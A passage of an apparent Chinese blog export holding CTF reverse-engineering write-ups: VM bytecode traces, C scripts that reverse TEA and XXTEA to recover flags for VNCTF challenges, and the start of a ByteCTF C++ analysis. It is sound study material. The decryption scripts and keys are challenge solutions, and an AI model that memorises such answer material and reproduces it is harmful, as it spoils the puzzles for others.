class="hljs-attribute">858</span> arr[<span class="hljs-number">19</span>]=<span class="hljs-number">387</span></span><br><span class="line"><span class="hljs-attribute">861</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">339</span></span><br><span class="line"><span class="hljs-attribute">864</span> if arr[<span class="hljs-number">1</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">867</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">4125344020</span></span><br><span class="line"><span class="hljs-attribute">870</span> if arr[<span class="hljs-number">2</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">873</span> pop arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">876</span> pop arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">879</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">295</span></span><br><span class="line"><span class="hljs-attribute">882</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">340</span></span><br><span class="line"><span class="hljs-attribute">885</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">888</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">579781142</span></span><br><span class="line"><span class="hljs-attribute">891</span> arr[<span class="hljs-number">19</span>]=<span class="hljs-number">387</span></span><br><span class="line"><span class="hljs-attribute">894</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">339</span></span><br><span class="line"><span class="hljs-attribute">897</span> if arr[<span class="hljs-number">1</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">900</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">2312395361</span></span><br><span class="line"><span class="hljs-attribute">903</span> if arr[<span class="hljs-number">2</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">906</span> pop arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">909</span> pop arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">912</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">306</span></span><br><span class="line"><span class="hljs-attribute">915</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">340</span></span><br><span class="line"><span class="hljs-attribute">918</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">921</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">1700499305</span></span><br><span class="line"><span class="hljs-attribute">924</span> arr[<span class="hljs-number">19</span>]=<span class="hljs-number">387</span></span><br><span class="line"><span class="hljs-attribute">927</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">339</span></span><br><span class="line"><span class="hljs-attribute">930</span> if arr[<span class="hljs-number">1</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">933</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">612671610</span></span><br><span class="line"><span class="hljs-attribute">936</span> if arr[<span class="hljs-number">2</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">939</span> pop arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">942</span> pop arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">945</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">317</span></span><br><span class="line"><span class="hljs-attribute">948</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">340</span></span><br><span class="line"><span class="hljs-attribute">951</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">954</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">3655723000</span></span><br><span class="line"><span class="hljs-attribute">957</span> arr[<span class="hljs-number">19</span>]=<span class="hljs-number">387</span></span><br><span class="line"><span class="hljs-attribute">960</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">339</span></span><br><span class="line"><span class="hljs-attribute">963</span> if arr[<span class="hljs-number">1</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">966</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">977540402</span></span><br><span class="line"><span class="hljs-attribute">969</span> if arr[<span class="hljs-number">2</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">972</span> pop arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">975</span> pop arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">978</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">328</span></span><br><span class="line"><span class="hljs-attribute">981</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">340</span></span><br><span class="line"><span class="hljs-attribute">984</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">987</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">2443935368</span></span><br><span class="line"><span class="hljs-attribute">990</span> arr[<span class="hljs-number">19</span>]=<span class="hljs-number">387</span></span><br><span class="line"><span class="hljs-attribute">993</span> arr[<span class="hljs-number">20</span>]=<span class="hljs-number">339</span></span><br><span class="line"><span class="hljs-attribute">996</span> if arr[<span class="hljs-number">1</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">999</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">1778148540</span></span><br><span class="line"><span class="hljs-attribute">1002</span> if arr[<span class="hljs-number">2</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">1005</span> pop arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">1008</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">8206181</span></span><br><span class="line"><span class="hljs-attribute">1011</span> if arr[<span class="hljs-number">1</span>]!=arr[<span class="hljs-number">0</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">1014</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">393</span></span><br><span class="line"><span class="hljs-attribute">1017</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1020</span> quitVM!</span><br><span class="line"><span class="hljs-attribute">1023</span> arr[<span class="hljs-number">3</span>]=<span class="hljs-number">2654435769</span></span><br><span class="line"><span class="hljs-attribute">1026</span> arr[<span class="hljs-number">4</span>]=<span class="hljs-number">613452</span></span><br><span class="line"><span class="hljs-attribute">1029</span> arr[<span class="hljs-number">5</span>]=<span class="hljs-number">34589</span></span><br><span class="line"><span class="hljs-attribute">1032</span> arr[<span class="hljs-number">6</span>]=<span class="hljs-number">108471</span></span><br><span class="line"><span class="hljs-attribute">1035</span> arr[<span class="hljs-number">7</span>]=<span class="hljs-number">1230791</span></span><br><span class="line"><span class="hljs-attribute">1038</span> arr[<span class="hljs-number">8</span>]=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">1041</span> arr[<span class="hljs-number">17</span>]=<span class="hljs-number">16</span></span><br><span class="line"><span class="hljs-attribute">1044</span> arr[<span class="hljs-number">18</span>]=<span class="hljs-number">32</span></span><br><span class="line"><span class="hljs-attribute">1047</span> arr[<span class="hljs-number">19</span>]=<span class="hljs-number">352</span></span><br><span class="line"><span class="hljs-attribute">1050</span> arr[<span class="hljs-number">10</span>]=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">1053</span> arr[<span class="hljs-number">11</span>]=<span class="hljs-number">32</span></span><br><span class="line"><span class="hljs-attribute">1056</span> arr[<span class="hljs-number">12</span>]=<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attribute">1059</span> arr[<span class="hljs-number">8</span>]+=arr[<span class="hljs-number">3</span>]</span><br><span class="line"><span class="hljs-attribute">1062</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">1065</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">17</span>]</span><br><span class="line"><span class="hljs-attribute">1068</span> arr[<span class="hljs-number">0</span>]+=arr[<span class="hljs-number">4</span>]</span><br><span class="line"><span class="hljs-attribute">1071</span> arr[<span class="hljs-number">14</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1074</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">1077</span> arr[<span class="hljs-number">0</span>]+=arr[<span class="hljs-number">8</span>]</span><br><span class="line"><span class="hljs-attribute">1080</span> arr[<span class="hljs-number">15</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1083</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">2</span>]</span><br><span class="line"><span class="hljs-attribute">1086</span> arr[<span class="hljs-number">0</span>]/=arr[<span class="hljs-number">18</span>]</span><br><span class="line"><span class="hljs-attribute">1089</span> arr[<span class="hljs-number">0</span>]+=arr[<span class="hljs-number">5</span>]</span><br><span class="line"><span class="hljs-attribute">1092</span> arr[<span class="hljs-number">16</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1095</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">14</span>]</span><br><span class="line"><span class="hljs-attribute">1098</span> arr[<span class="hljs-number">0</span>]^=arr[<span class="hljs-number">15</span>]</span><br><span class="line"><span class="hljs-attribute">1101</span> arr[<span class="hljs-number">0</span>]^=arr[<span class="hljs-number">16</span>]</span><br><span class="line"><span class="hljs-attribute">1104</span> arr[<span class="hljs-number">1</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1107</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">1110</span> arr[<span class="hljs-number">0</span>]*=arr[<span class="hljs-number">17</span>]</span><br><span class="line"><span class="hljs-attribute">1113</span> arr[<span class="hljs-number">0</span>]+=arr[<span class="hljs-number">6</span>]</span><br><span class="line"><span class="hljs-attribute">1116</span> arr[<span class="hljs-number">14</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1119</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">1122</span> arr[<span class="hljs-number">0</span>]+=arr[<span class="hljs-number">8</span>]</span><br><span class="line"><span class="hljs-attribute">1125</span> arr[<span class="hljs-number">15</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1128</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-attribute">1131</span> arr[<span class="hljs-number">0</span>]/=arr[<span class="hljs-number">18</span>]</span><br><span class="line"><span class="hljs-attribute">1134</span> arr[<span class="hljs-number">0</span>]+=arr[<span class="hljs-number">7</span>]</span><br><span class="line"><span class="hljs-attribute">1137</span> arr[<span class="hljs-number">16</span>]=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1140</span> arr[<span class="hljs-number">0</span>]=arr[<span class="hljs-number">14</span>]</span><br><span class="line"><span class="hljs-attribute">1143</span> arr[<span class="hljs-number">0</span>]^=arr[<span class="hljs-number">15</span>]</span><br><span class="line"><span class="hljs-attribute">1146</span> arr[<span class="hljs-number">0</span>]^=arr[<span class="hljs-number">16</span>]</span><br><span class="line"><span class="hljs-attribute">1149</span> arr[<span class="hljs-number">2</span>]+=arr[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-attribute">1152</span> arr[<span class="hljs-number">11</span>]-=arr[<span class="hljs-number">12</span>]</span><br><span class="line"><span class="hljs-attribute">1155</span> if arr[<span class="hljs-number">11</span>]!=arr[<span class="hljs-number">10</span>]:</span><br><span class="line">  <span class="hljs-attribute">jmp</span> <span class="hljs-number">3</span>*arr[<span class="hljs-number">19</span>]</span><br><span class="line"><span class="hljs-attribute">1158</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">20</span>]</span><br><span class="line"><span class="hljs-attribute">1161</span> nop</span><br><span class="line"><span class="hljs-attribute">1164</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">110</span></span><br><span class="line"><span class="hljs-attribute">1167</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">1170</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">111</span></span><br><span class="line"><span class="hljs-attribute">1173</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">1176</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">20</span>]</span><br><span class="line"><span class="hljs-attribute">1179</span> nop</span><br><span class="line"><span class="hljs-attribute">1182</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">121</span></span><br><span class="line"><span class="hljs-attribute">1185</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">1188</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">101</span></span><br><span class="line"><span class="hljs-attribute">1191</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">1194</span> arr[<span class="hljs-number">0</span>]=<span class="hljs-number">115</span></span><br><span class="line"><span class="hljs-attribute">1197</span> putchar(arr[<span class="hljs-number">0</span>])</span><br><span class="line"><span class="hljs-attribute">1200</span> jmp <span class="hljs-number">3</span>*arr[<span class="hljs-number">20</span>]</span><br></pre></td></tr></tbody></table></figure><p>程序很简单，循环输入，每四个Byte按照小端序转换成DWORD，前10个DWORD进行tea加密，然后对比一下结果就行了</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> *v, <span class="hljs-keyword">uint32_t</span> *k)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, i;</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    }</span><br><span class="line">    v[<span class="hljs-number">0</span>] = v0;</span><br><span class="line">    v[<span class="hljs-number">1</span>] = v1;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">11</span>] = {<span class="hljs-number">3906065887</span>, <span class="hljs-number">4125344020</span>, <span class="hljs-number">579781142</span>, <span class="hljs-number">2312395361</span>, <span class="hljs-number">1700499305</span>, <span class="hljs-number">612671610</span>, <span class="hljs-number">3655723000</span>, <span class="hljs-number">977540402</span>, <span class="hljs-number">2443935368</span>, <span class="hljs-number">1778148540</span>, <span class="hljs-number">8206181</span>}, k[<span class="hljs-number">4</span>] = {<span class="hljs-number">613452</span>, <span class="hljs-number">34589</span>, <span class="hljs-number">108471</span>, <span class="hljs-number">1230791</span>};</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i += <span class="hljs-number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        decrypt(v + i, k);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, v[i] &gt;&gt; (j * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="cm1"><a href="#cm1" class="headerlink" title="cm1"></a>cm1</h3><p>android，动态加载dex，主要的代码逻辑都在动态加载的dex里，直接运行然后把生成的classes.dex拷贝出来</p><p><img src="/2022/02/18/VNCTF-2022-wp/cm1.png" alt="4"></p><p>密文，密钥，加密方式都有，很明显是xxtea，写脚本直接解密</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="hljs-meta-string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> *v, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> key[<span class="hljs-number">4</span>])</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> p, rounds, e;</span><br><span class="line"></span><br><span class="line">    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;</span><br><span class="line">    sum = rounds * DELTA;</span><br><span class="line">    y = v[<span class="hljs-number">0</span>];</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">    {</span><br><span class="line">        e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)</span><br><span class="line">        {</span><br><span class="line">            z = v[p - <span class="hljs-number">1</span>];</span><br><span class="line">            y = v[p] -= MX;</span><br><span class="line">        }</span><br><span class="line">        z = v[n - <span class="hljs-number">1</span>];</span><br><span class="line">        y = v[<span class="hljs-number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    } <span class="hljs-keyword">while</span> (--rounds);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">11</span>] = {<span class="hljs-number">1822697284</span>, <span class="hljs-number">3377000110</span>, <span class="hljs-number">187091018</span>, <span class="hljs-number">3630257212</span>, <span class="hljs-number">2925741911</span>, <span class="hljs-number">3106891896</span>, <span class="hljs-number">553699270</span>, <span class="hljs-number">3654559274</span>, <span class="hljs-number">1560179140</span>, <span class="hljs-number">850622133</span>, <span class="hljs-number">2518690695</span>};</span><br><span class="line">    <span class="hljs-keyword">uint32_t</span> <span class="hljs-keyword">const</span> k[<span class="hljs-number">4</span>] = {<span class="hljs-number">1349530696</span>, <span class="hljs-number">1314283353</span>, <span class="hljs-number">558257219</span>, <span class="hljs-number">1333153569</span>};</span><br><span class="line">    <span class="hljs-keyword">int</span> n = <span class="hljs-number">11</span>;</span><br><span class="line">    btea(v, n, k);</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, v[i] &gt;&gt; (j * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> vnctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L3HCTF re double-joy 题解</title>
      <link href="/2021/11/25/L3HCTF-re-double-joy-%E9%A2%98%E8%A7%A3/"/>
      <url>/2021/11/25/L3HCTF-re-double-joy-%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>备份的时候出了问题内容不见了，所以见<a href="https://xz.aliyun.com/t/10538">先知</a></p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ByteCTF re moderncpp 题解</title>
      <link href="/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/"/>
      <url>/2021/11/04/ByteCTF-re-moderncpp-%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>首发于<a href="https://xz.aliyun.com/t/10426">先知</a></p><span id="more"></span><p>题目本身并不难，最大的难点在于要逆C++的数据结构，导致程序的逻辑难以理解。</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main函数位于0x402954，主要的逻辑就是输入、进行检查、初始化、数据处理以及最后的对比。</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  __int64 v3; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="hljs-comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="hljs-comment">// rbx</span></span><br><span class="line">  <span class="hljs-built_in"><span class="hljs-keyword">void</span></span> (__fastcall *v6)(<span class="hljs-keyword">char</span> *, __int64, __int64); <span class="hljs-comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="hljs-comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v11[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v12[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="hljs-keyword">char</span> answer[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="hljs-keyword">char</span> input[<span class="hljs-number">47</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [rsp+6Fh] [rbp-51h] BYREF</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v16[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+80h] [rbp-40h] 